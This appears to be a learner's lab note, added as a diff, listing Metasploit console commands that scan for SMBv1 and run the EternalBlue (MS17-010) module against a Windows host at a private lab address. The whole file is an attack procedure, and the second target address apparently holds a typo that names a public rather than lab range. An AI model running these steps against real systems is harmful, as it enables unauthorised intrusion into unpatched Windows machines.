@@ -1,0 +1,17 @@
+# eternal blue is a vulnerbility for windows operating system because of  a service called SMB 
+
+# check if the  smb version is 1 
+
+search smb_version
+
+set RHOSTS  192.168.56.3
+
+# use eternal blue module 
+
+search ms17 
+
+set RHOSTS 191.168.56.3
+
+check # if the target system is vulnerable
+
+exploit 
